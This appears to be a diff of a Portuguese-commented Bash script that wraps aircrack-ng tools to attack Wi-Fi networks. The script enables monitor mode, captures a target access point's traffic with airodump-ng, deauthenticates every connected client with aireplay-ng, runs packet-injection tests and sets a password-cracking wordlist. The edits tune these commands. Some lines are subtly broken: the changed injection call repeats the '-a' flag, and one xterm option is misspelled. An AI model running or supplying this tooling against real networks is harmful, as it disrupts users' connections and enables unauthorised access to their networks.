@@ -43,7 +43,7 @@ function verificar_dependencias(){
 
 function iniciar_mon() {
 # Adiciona a interface de monitoramento wlan0mon. Caso contrario, emite mensagem de erro
-iw dev wlan0 interface add wlan0mon type monitor &> /dev/null && ifconfig wlan0mon up &> /dev/null && \
+iw dev wlan0 interface add wlan0mon type monitor &> /dev/null && ifconfig wlan0mon up &> /dev/null && clear && \
 echo -e "[ ok ] modo monitoramento ativado!" || echo -e "[ falha ] erro em iniciar modo monitor."
 
 }
@@ -85,7 +85,7 @@ function setar_parametros(){
 	--field "* Channel" "" \
 	--field "Client" "" \
 	--field "* Monitor" " wlan0mon" \
-	--field "* Wordlist" "~/king-size/wordlist/rockyou.txt" \
+	--field "* Wordlist" "/usr/share/set/src/fasttrack/wordlist.txt" \
 	--button gtk-ok \
 	--button cancel \
 	--center &)
@@ -111,9 +111,11 @@ setar_parametros
 [ -z $CHANNEL ] || echo "[ FALHA ] O campo obrigatorio Channel esta vazio"
 [ -z $INTERFACE_MON ] || echo "[ FALHA ] O campo obrigatorio Monitor esta vazio"
 
+# Ajustar a interface de monitoramento para varrer hosts apenas no canal desejado
+iw dev $INTERFACE_MON set channel $CHANNEL
 # Capture no minimo 5000 (5 mil) pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
 (xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
--e "airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
+-e "airodump-ng --bssid $BSSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
 echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"
 
 }
@@ -121,7 +123,7 @@ echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"
 function deauth_todos_clientes() {
 # Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
 (xterm -geometry 85x25 -tilte "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
--e  "aireplay-ng -0 1 -a $BSSID $INTERFACE_MON" &) || \
+-e  "aireplay-ng -0 1 -a $BSSID -e $ESSID $INTERFACE_MON --ignore-negative-one" &) || \
 echo "[ FALHA ] Ocorreram erros em fazer deauth dos hosts no AP: $ESSID"
 
 }
@@ -141,7 +143,7 @@ function injetar(){
 while true; do
 # Realizar testes de injecao contra um AP
 (xterm -geometry 85x25 -title "Realizando Injecao de pacotes no AP: $ESSID" \
--e "aireplay-ng -9 -a $BSSID -e $ESSID $INTERFACE_MON") || \
+-e "aireplay-ng -9 -a $BSSID -a $BSSID $INTERFACE_MON --ignore-negative-one") || \
 echo "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID"
 
 done
@@ -227,6 +229,8 @@ function menu(){
 while true; do
 cat << EOF
 1. Ativar a interface em modo monitoramento
+#2. WEP
+#3. WPA/WPA2 e WPS
 2. Varrer todas as redes sem fio alcancadas
 3. Varrer rede especifica
 4. Desautenticar todos as STA de um AP
